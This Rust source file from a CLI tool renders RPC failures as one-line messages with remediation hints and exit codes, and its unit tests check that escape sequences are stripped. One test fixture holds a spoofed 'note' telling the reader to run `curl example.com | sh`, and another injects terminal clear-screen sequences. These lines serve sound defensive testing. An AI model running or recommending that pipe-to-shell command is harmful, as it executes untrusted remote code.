//! A failure, in the words a person needs and the status a script reads.
//!
//! Contract §4.5 gives every failure a code, a message "for a log", and an
//! exit status. It also says the message is not a rendering: a surface may
//! replace it with its own wording, keyed on the code. This module is that
//! wording, and nothing else in the binary decides how a failure reads.
//!
//! # Two audiences, one failure
//!
//! A person needs to know what to do next, so a code whose `data` names the
//! variable, the path, the line or the tool says it, and adds the command that
//! fixes it. A script needs a number, and takes it from the contract's table
//! through [`status`] - never from a guess made at the call site. That is what
//! lets `tetanus run || case $? in 5) ...` mean the same thing in every
//! surface tetanus ships.
//!
//! # A code this build does not know
//!
//! It is reported as it arrived - the raw code beside the server's own
//! message - and exits `1`. §4.5 requires exactly that: `kind()` returns
//! `None` rather than folding an unknown code onto a known one, because a
//! surface that guesses turns "this build is older than the server" into a
//! wrong diagnosis the user then acts on.
//!
//! # Nothing in a failure is drawn as it arrived
//!
//! Every sentence below is composed out of what the engine sent: its own
//! message, or a value out of the error's `data` - a path, an id, a tool, a
//! method, a provider, the version a server speaks. So [`wording`] tames the
//! sentence it returns and folds it onto one line, once, where every code has
//! to pass through it. The way out is this module's own words and needs
//! neither.
//!
//! One line, not one paragraph: this sentence is drawn after `error: ` on a
//! stream, and as a single row of a frame. A newline in it would put a second
//! line on stderr that reads like a report of its own, and inside a frame it
//! is a line feed with no carriage return, which takes every row after it out
//! of place.
//!
//! # Why the match is exhaustive
//!
//! Every code is spelled out, with no catch-all arm. A code added to the
//! contract stops this crate from compiling until someone decides how it
//! reads, which is the cheapest moment to decide it.

use tetanus_protocol::rpc::{ErrorCode, RpcError};
use tetanus_ui::{tame_line, wrap, Role, Theme};

/// The same failure as rows of a transcript, for a surface that has no stderr
/// to report it on.
///
/// A turn watched full-screen fails inside the view: the ordinary line goes to
/// stderr, which is behind the alternate screen and not read until the reader
/// has already given up on a turn they were told nothing about. So the failure
/// lands where the turn was being read, in the wording [`wording`] gives every
/// other surface, and the marks are the ones a failed tool call already uses.
pub fn lines(theme: &Theme, cols: usize, error: &RpcError) -> Vec<String> {
    let (message, note) = wording(error);
    let glyph = theme.glyph("✗", "!");
    // Two columns of indent for the mark, and two more for what a note says
    // about the line over it, which is the transcript's own shape.
    let mut lines = vec![format!(
        "  {} {}",
        theme.paint(Role::Error, glyph),
        theme.paint(Role::Error, &message)
    )];
    let Some(note) = note else {
        return lines;
    };
    lines.extend(
        wrap(&note, cols.saturating_sub(6).max(1))
            .into_iter()
            .map(|line| format!("    {}", theme.paint(Role::Muted, &line))),
    );
    lines
}

/// The sentence to print, and the way out when there is one.
///
/// The sentence is tamed and folded onto one line here rather than in each
/// arm of [`said`], because every arm composes it out of something the engine
/// sent, and a code added to the contract must not be able to miss this. The
/// way out is tamed for the same reason: an arm that names a directory names
/// one a document could have written.
pub fn wording(error: &RpcError) -> (String, Option<String>) {
    let (message, note) = said(error);
    (tame_line(&message), note.map(|note| tame_line(&note)))
}

/// The same sentence, before it is tamed. Every arm is worded here.
fn said(error: &RpcError) -> (String, Option<String>) {
    let Some(code) = error.kind() else {
        // §4.5: report the raw code, never remap it.
        return (format!("{} (error {})", error.message, error.code), None);
    };
    match code {
        ErrorCode::MissingCredential => (
            format!(
                "{} is not set",
                field(error, "env").unwrap_or_else(|| error.message.clone())
            ),
            Some("export it, or run with `--adapter mock` for an offline turn".into()),
        ),
        ErrorCode::ProviderError => (
            match (field(error, "provider"), number(error, "status")) {
                (Some(provider), Some(status)) => format!("{provider} answered {status}"),
                (Some(provider), None) => format!("{provider} could not be reached"),
                _ => error.message.clone(),
            },
            Some("try again, or run with `--adapter mock` for an offline turn".into()),
        ),
        ErrorCode::LogCorrupt => (
            match number(error, "line") {
                Some(line) => corrupt_at(line),
                None => error.message.clone(),
            },
            Some("read what is before it with `tetanus replay <path> --raw`".into()),
        ),
        ErrorCode::Io => (
            match field(error, "path") {
                // The prefix is here for a sentence that says what went wrong
                // without saying what it went wrong on. A sentence that names
                // the path already needs no help, and naming it twice reads as
                // two paths - which, for a reader deciding which file to open,
                // is worse than either.
                Some(path) if error.message.contains(&path) => error.message.clone(),
                Some(path) => format!("{path}: {}", error.message),
                None => error.message.clone(),
            },
            None,
        ),
        // A path the user typed and an id that has gone are different
        // mistakes: one is a typo to fix here, the other is a session to
        // find again. They do not get the same way out.
        ErrorCode::SessionNotFound => match (field(error, "path"), field(error, "session_id")) {
            // A target that was looked for under a root was not a path the
            // user could see, so the way out names where it was looked for:
            // the reader typed an id, and the id is right or the root is.
            (Some(path), _) => (
                format!("no journal at {path}"),
                Some(match field(error, "root") {
                    Some(root) => format!(
                        "nothing there, and nothing named that under {root}; \
                         list what there is with `tetanus sessions`"
                    ),
                    None => "check the path, or list what there is with `tetanus sessions`".into(),
                }),
            ),
            (None, Some(id)) => (
                format!("no session {id}"),
                Some("name the journal by path to open it again".into()),
            ),
            (None, None) => (
                error.message.clone(),
                Some("name the journal by path to open it again".into()),
            ),
        },
        ErrorCode::SessionBusy => (
            match field(error, "session_id") {
                Some(id) => format!("a turn is already running on {id}"),
                None => error.message.clone(),
            },
            Some("wait for it to end, or stop it with Ctrl-C".into()),
        ),
        ErrorCode::ToolUnknown => (
            match field(error, "name") {
                Some(name) => format!("this build has no tool called {name}"),
                None => error.message.clone(),
            },
            Some("list the tools it does have with `tetanus tools`".into()),
        ),
        ErrorCode::NotImplemented => (
            match field(error, "method") {
                Some(method) => format!("this build does not serve {method} yet"),
                None => error.message.clone(),
            },
            None,
        ),
        ErrorCode::UnsupportedProtocolVersion => (
            match (field(error, "server"), field(error, "client")) {
                (Some(server), Some(client)) => {
                    format!("the server speaks protocol {server}; this build speaks {client}")
                }
                _ => error.message.clone(),
            },
            Some("use a tetanus build that matches the server".into()),
        ),
        ErrorCode::InvalidParams => (
            match field(error, "field") {
                Some(name) => format!("{name} is not acceptable: {}", error.message),
                None => error.message.clone(),
            },
            Some("`tetanus <command> --help` lists what each flag takes".into()),
        ),
        ErrorCode::Cancelled => ("interrupted".into(), None),
        // Nothing a user can act on, so nothing is invented: the server's own
        // sentence, which is what a bug report needs to carry anyway.
        ErrorCode::Internal
        | ErrorCode::ParseError
        | ErrorCode::InvalidRequest
        | ErrorCode::MethodNotFound => (error.message.clone(), None),
    }
}

/// The status the process exits with, from the contract's table.
///
/// The table is the single source (§4.5), so this function is the only place
/// the binary decides a failing status, and an unknown code exits `1`.
pub fn status(error: &RpcError) -> u8 {
    error.kind().map(ErrorCode::exit_status).unwrap_or(1)
}

/// One string out of the error's `data`, when the code carries one.
fn field(error: &RpcError, name: &str) -> Option<String> {
    error.data.as_ref()?.get(name)?.as_str().map(str::to_string)
}

/// One number out of the error's `data`.
/// How a corrupt journal reads, wherever it is reported.
///
/// The raw view reports the same failure with a note of its own - it cannot
/// send a user to `--raw` when `--raw` is what printed the line - so the
/// sentence lives here and not inside the match above, and the two reports
/// cannot drift into two vocabularies for one file.
pub fn corrupt_at(line: u64) -> String {
    format!("the journal is not readable at line {line}")
}

fn number(error: &RpcError, name: &str) -> Option<u64> {
    error.data.as_ref()?.get(name)?.as_u64()
}

/// Test Design Specification: how a failure reads, and what it exits with.
///
/// Features tested: the exit status of every code against the contract's own
/// table; that a code carrying `data` says what the data names; that a code
/// with no `data` falls back to the server's sentence rather than printing a
/// blank; that an unknown code is reported raw and exits 1; and that the same
/// failure read as rows of a transcript is worded the same way, marked the way
/// a failed tool call is, and folded to the width it is given; that no value
/// a failure carries can drive the terminal it is reported on; and that a
/// message the engine wrote on more than one line is reported on one.
///
/// Features NOT tested here: which failure the binary raises for a given
/// situation (owned by `main.rs`, asserted end to end in
/// `tests/presentation.rs`), and the `error:`/`note:` shapes themselves
/// (owned by `tetanus-ui`).
///
/// Environmental needs: none.
#[cfg(test)]
mod tests {
    use serde_json::json;
    use tetanus_ui::{visible_width, Charset};

    use super::*;

    fn fault(code: ErrorCode, message: &str, data: Option<serde_json::Value>) -> RpcError {
        let error = RpcError::new(code, message);
        match data {
            Some(data) => error.with_data(data),
            None => error,
        }
    }

    /// Every code the contract defines, so the table below cannot go stale
    /// against `ErrorCode` gaining a variant.
    const CODES: [ErrorCode; 15] = [
        ErrorCode::ParseError,
        ErrorCode::InvalidRequest,
        ErrorCode::MethodNotFound,
        ErrorCode::InvalidParams,
        ErrorCode::Internal,
        ErrorCode::UnsupportedProtocolVersion,
        ErrorCode::NotImplemented,
        ErrorCode::SessionNotFound,
        ErrorCode::SessionBusy,
        ErrorCode::Cancelled,
        ErrorCode::MissingCredential,
        ErrorCode::ProviderError,
        ErrorCode::ToolUnknown,
        ErrorCode::LogCorrupt,
        ErrorCode::Io,
    ];

    /// TC-CLI-ERR-1: the exit status of every code.
    /// Expected: the contract's table, exactly. §4.5 calls the column the
    /// contract and not a suggestion, so this surface reads it rather than
    /// holding a second copy that can drift.
    #[test]
    fn every_status_comes_from_the_contract() {
        let expected = [2, 2, 2, 2, 1, 3, 3, 4, 4, 130, 5, 6, 4, 1, 1];
        for (code, want) in CODES.into_iter().zip(expected) {
            let error = fault(code, "something went wrong", None);
            assert_eq!(status(&error), want, "{code:?}");
        }
    }

    /// TC-CLI-ERR-2: a code carrying `data`.
    /// Expected: the sentence names what the data names, and the note names
    /// the command that fixes it. A failure that says only "it failed" hands
    /// the user a search, not an answer.
    #[test]
    fn a_failure_says_what_the_data_names() {
        let cases = [
            (
                fault(
                    ErrorCode::MissingCredential,
                    "no credential",
                    Some(json!({ "provider": "deepseek", "env": "DEEPSEEK_API_KEY" })),
                ),
                "DEEPSEEK_API_KEY is not set",
                "--adapter mock",
            ),
            (
                fault(
                    ErrorCode::ProviderError,
                    "upstream failed",
                    Some(json!({ "provider": "deepseek", "status": 503 })),
                ),
                "deepseek answered 503",
                "try again",
            ),
            (
                fault(
                    ErrorCode::LogCorrupt,
                    "bad line",
                    Some(json!({ "session_id": "s1", "line": 12 })),
                ),
                "the journal is not readable at line 12",
                "--raw",
            ),
            (
                fault(
                    ErrorCode::ToolUnknown,
                    "no such tool",
                    Some(json!({ "name": "write_file" })),
                ),
                "this build has no tool called write_file",
                "tetanus tools",
            ),
            (
                fault(
                    ErrorCode::Io,
                    "permission denied",
                    Some(json!({ "path": "/srv/j.jsonl" })),
                ),
                "/srv/j.jsonl: permission denied",
                "",
            ),
            // The same code, two mistakes. A path the user typed is fixed by
            // looking at the path; an id that has gone is found again by
            // naming the journal it lives in.
            (
                fault(
                    ErrorCode::SessionNotFound,
                    "no such journal",
                    Some(json!({ "path": "nope.jsonl" })),
                ),
                "no journal at nope.jsonl",
                "tetanus sessions",
            ),
            (
                fault(
                    ErrorCode::SessionNotFound,
                    "no such session",
                    Some(json!({ "session_id": "s1755" })),
                ),
                "no session s1755",
                "name the journal by path",
            ),
        ];

        for (error, sentence, hint) in cases {
            let (said, note) = wording(&error);
            assert_eq!(said, sentence);
            if !hint.is_empty() {
                let note = note.unwrap_or_default();
                assert!(note.contains(hint), "`{note}` does not name `{hint}`");
            }
        }
    }

    /// TC-CLI-ERR-3: a code whose `data` is absent, and one whose `data` is
    /// the wrong shape.
    /// Expected: the server's own sentence, never an empty line or a panic.
    /// `data` is optional in the envelope, and a surface that assumed it is
    /// there would fail on the failure.
    #[test]
    fn a_failure_with_no_data_still_says_something() {
        for data in [
            None,
            Some(json!({ "unexpected": true })),
            Some(json!("text")),
        ] {
            let error = fault(ErrorCode::ProviderError, "the provider failed", data);
            assert_eq!(wording(&error).0, "the provider failed");
        }
    }

    /// TC-CLI-ERR-4: a code from a newer server.
    /// Expected: the raw code beside the server's message, and exit 1. §4.5
    /// forbids folding it onto a code this build knows: a wrong diagnosis is
    /// acted on, an unfamiliar one is reported.
    #[test]
    fn an_unknown_code_is_reported_as_it_arrived() {
        let error = RpcError {
            code: -32050,
            message: "the wire caught fire".into(),
            data: None,
        };

        assert_eq!(wording(&error).0, "the wire caught fire (error -32050)");
        assert_eq!(wording(&error).1, None);
        assert_eq!(status(&error), 1);
    }

    /// TC-CLI-ERR-5: a failure as rows of a transcript.
    /// Expected: at 80 columns, the same wording the printed report gives,
    /// behind the mark a failed tool call already uses, with the way out on
    /// the line under it; at 34, the way out folded to the width and still
    /// indented under the line it is about. A view that worded a failure its
    /// own way would be a second place to keep every sentence in this module
    /// right.
    #[test]
    fn a_failure_reads_the_same_way_on_a_page() {
        let theme = Theme::new(false, Charset::Ascii);
        let error = fault(
            ErrorCode::ProviderError,
            "unreachable",
            Some(json!({ "provider": "deepseek" })),
        );
        let (message, note) = wording(&error);

        let lines = lines(&theme, 80, &error);
        assert_eq!(lines[0], format!("  ! {message}"));
        assert_eq!(lines.len(), 2, "{lines:?}");
        assert_eq!(lines[1], format!("    {}", note.expect("a way out")));

        // Folded to the width, and still indented under the line it is about.
        let narrow = self::lines(&theme, 34, &error);
        assert!(narrow.len() > 2, "the note did not fold: {narrow:?}");
        for line in &narrow[1..] {
            assert!(line.starts_with("    "), "{narrow:?}");
            assert!(visible_width(line) <= 34, "`{line}` overruns the width");
        }

        // A failure with no way out is the one line.
        let bare = fault(ErrorCode::Io, "no such file", None);
        assert_eq!(self::lines(&theme, 80, &bare).len(), 1);
    }

    /// TC-CLI-ERR-6: every code, with a sequence in the message and in every
    /// value a `data` can carry.
    /// Expected: no sequence reaches the sentence, the way out or the rows,
    /// and the words either side of it still read. A failure is composed out
    /// of what the engine sent, and it is reported under `--color never`,
    /// which promises the stream carries no colour of anyone's.
    #[test]
    fn nothing_in_a_failure_can_drive_the_terminal() {
        let clear = "\u{1b}[2J";
        let theme = Theme::new(false, Charset::Ascii);
        let data = json!({
            "env": format!("DEEP{clear}KEY"),
            "provider": format!("deep{clear}seek"),
            "path": format!("na{clear}sty.jsonl"),
            "session_id": format!("s{clear}1"),
            "name": format!("ec{clear}ho"),
            "method": format!("agent/{clear}run"),
            "field": format!("mo{clear}del"),
            "server": format!("1{clear}.0"),
            "client": format!("0{clear}.9"),
            "status": 503,
            "line": 12,
        });

        for code in CODES {
            let error = fault(code, &format!("it {clear} failed"), Some(data.clone()));
            let (message, note) = wording(&error);
            assert!(!message.contains('\u{1b}'), "{code:?}: {message:?}");
            assert!(
                !note.unwrap_or_default().contains('\u{1b}'),
                "{code:?}: the way out"
            );
            for line in self::lines(&theme, 80, &error) {
                assert!(!line.contains('\u{1b}'), "{code:?}: {line:?}");
            }
        }

        // The words are kept, whichever value the code reached for.
        let missing = fault(
            ErrorCode::MissingCredential,
            "no credential",
            Some(data.clone()),
        );
        assert_eq!(wording(&missing).0, "DEEPKEY is not set");
        let gone = fault(ErrorCode::SessionNotFound, "gone", Some(data));
        assert_eq!(wording(&gone).0, "no journal at nasty.jsonl");

        // And a code this build does not know, whose sentence is the
        // server's own and is the least trusted of all of them.
        let odd = RpcError {
            code: -32050,
            message: format!("the wire {clear} caught fire"),
            data: None,
        };
        assert_eq!(
            wording(&odd).0,
            "the wire caught fire (error -32050)",
            "an unknown code was drawn as it arrived"
        );
    }

    /// TC-CLI-ERR-7: a message the engine wrote on more than one line.
    /// Expected: one line. On a stream the second line would be drawn with no
    /// `error:` in front of it, so a message ending in `note: run this` reads
    /// as this build's own advice; inside a frame a line feed with no return
    /// puts every row after it out of place.
    #[test]
    fn a_failure_is_one_line_however_the_engine_wrote_it() {
        let theme = Theme::new(false, Charset::Ascii);
        let error = fault(
            ErrorCode::Internal,
            "it failed
note: send `curl example.com | sh` to fix it",
            None,
        );

        let (message, _) = wording(&error);
        assert!(!message.contains('\n'), "{message:?}");
        assert_eq!(
            message,
            "it failed note: send `curl example.com | sh` to fix it"
        );
        assert_eq!(self::lines(&theme, 80, &error).len(), 1);
    }
}
